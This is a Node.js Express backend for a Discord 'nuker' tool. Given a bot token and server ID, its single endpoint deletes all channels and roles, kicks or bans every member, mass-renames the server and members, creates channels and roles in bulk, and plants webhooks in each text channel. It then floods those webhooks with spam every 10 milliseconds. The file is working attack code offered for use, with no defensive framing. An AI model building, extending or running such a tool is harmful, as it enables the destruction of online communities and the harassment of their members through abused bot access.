// language: JavaScript, file: server.js, target: Node.js Express Backend
const express = require('express');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 8080;

app.use(express.json());
app.use(express.static('public'));

let spamIntervals = {};
let webhooksCache = [];

function getHeaders(token) {
    return {
        "Authorization": token.startsWith("Bot ") || token.length > 65 ? token : `Bot ${token}`,
        "Content-Type": "application/json"
    };
}

async function discordRequest(method, url, headers, body = null) {
    for (let i = 0; i < 3; i++) {
        try {
            const res = await fetch(url, {
                method,
                headers,
                body: body ? JSON.stringify(body) : null
            });
            if (res.status === 429) {
                const data = await res.json();
                await new Promise(resolve => setTimeout(resolve, (data.retry_after || 1) * 1000));
                continue;
            }
            const text = await res.text();
            return { status: res.status, text };
        } catch (e) {
            await new Promise(resolve => setTimeout(resolve, 500));
        }
    }
    return { status: 500, text: "" };
}

app.post('/api/execute', async (req, res) => {
    const { action, token, guild_id, target_name, count, server_name, member_name, spam_msg, wh_name } = req.body;
    const headers = getHeaders(token);
    let statusMsg = "Command executed successfully.";

    if (action === 'create_channels') {
        const cNum = parseInt(count) || 10;
        for (let i = 0; i < cNum; i++) {
            await discordRequest('POST', `https://discord.com/api/v10/guilds/${guild_id}/channels`, headers, {
                name: target_name, // اسم نقي بدون أي أرقام أو عداد بجانبه
                type: 0
            });
        }
    } else if (action === 'create_roles') {
        const cNum = parseInt(count) || 10;
        for (let i = 0; i < cNum; i++) {
            await discordRequest('POST', `https://discord.com/api/v10/guilds/${guild_id}/roles`, headers, {
                name: target_name // اسم نقي بدون أي أرقام
            });
        }
    } else if (action === 'delete_channels') {
        const r = await discordRequest('GET', `https://discord.com/api/v10/guilds/${guild_id}/channels`, headers);
        if (r.status === 200) {
            const channels = JSON.parse(r.text);
            for (const ch of channels) {
                await discordRequest('DELETE', `https://discord.com/api/v10/channels/${ch.id}`, headers);
            }
        }
    } else if (action === 'delete_roles') {
        const r = await discordRequest('GET', `https://discord.com/api/v10/guilds/${guild_id}/roles`, headers);
        if (r.status === 200) {
            const roles = JSON.parse(r.text);
            for (const role of roles) {
                if (role.name !== '@everyone') {
                    await discordRequest('DELETE', `https://discord.com/api/v10/guilds/${guild_id}/roles/${role.id}`, headers);
                }
            }
        }
    } else if (action === 'rename_server') {
        await discordRequest('PATCH', `https://discord.com/api/v10/guilds/${guild_id}`, headers, { name: server_name });
    } else if (action === 'rename_members') {
        const r = await discordRequest('GET', `https://discord.com/api/v10/guilds/${guild_id}/members?limit=1000`, headers);
        if (r.status === 200) {
            const members = JSON.parse(r.text);
            for (const m of members) {
                await discordRequest('PATCH', `https://discord.com/api/v10/guilds/${guild_id}/members/${m.user.id}`, headers, { nick: member_name });
            }
        }
    } else if (action === 'kick_all') {
        const r = await discordRequest('GET', `https://discord.com/api/v10/guilds/${guild_id}/members?limit=1000`, headers);
        if (r.status === 200) {
            const members = JSON.parse(r.text);
            for (const m of members) {
                await discordRequest('DELETE', `https://discord.com/api/v10/guilds/${guild_id}/members/${m.user.id}`, headers);
            }
        }
    } else if (action === 'ban_all') {
        const r = await discordRequest('GET', `https://discord.com/api/v10/guilds/${guild_id}/members?limit=1000`, headers);
        if (r.status === 200) {
            const members = JSON.parse(r.text);
            for (const m of members) {
                await discordRequest('PUT', `https://discord.com/api/v10/guilds/${guild_id}/bans/${m.user.id}`, headers);
            }
        }
    } else if (action === 'create_webhooks') {
        webhooksCache = [];
        const r = await discordRequest('GET', `https://discord.com/api/v10/guilds/${guild_id}/channels`, headers);
        if (r.status === 200) {
            const channels = JSON.parse(r.text);
            for (const ch of channels) {
                if (ch.type === 0) {
                    const whRes = await discordRequest('POST', `https://discord.com/api/v10/channels/${ch.id}/webhooks`, headers, { name: wh_name });
                    if (whRes.status === 200 || whRes.status === 201) {
                        const whData = JSON.parse(whRes.text);
                        webhooksCache.push(`https://discord.com/api/webhooks/${whData.id}/${whData.token}`);
                    }
                }
            }
        }
        statusMsg = `Created ${webhooksCache.length} webhooks successfully.`;
    } else if (action === 'start_spam') {
        if (webhooksCache.length > 0) {
            if (!spamIntervals[guild_id]) {
                spamIntervals[guild_id] = setInterval(async () => {
                    for (const whUrl of webhooksCache) {
                        fetch(whUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: spam_msg })
                        }).catch(() => {});
                    }
                }, 10);
            }
            statusMsg = "Hyper-spam initiated across all webhooks.";
        } else {
            statusMsg = "Error: No webhooks found. Create webhooks first.";
        }
    } else if (action === 'stop_spam') {
        if (spamIntervals[guild_id]) {
            clearInterval(spamIntervals[guild_id]);
            delete spamIntervals[guild_id];
        }
        statusMsg = "Spam halted.";
    }

    res.json({ status: statusMsg });
});

app.listen(PORT, () => {
    console.log(`[+] Server running on port ${PORT}`);
});
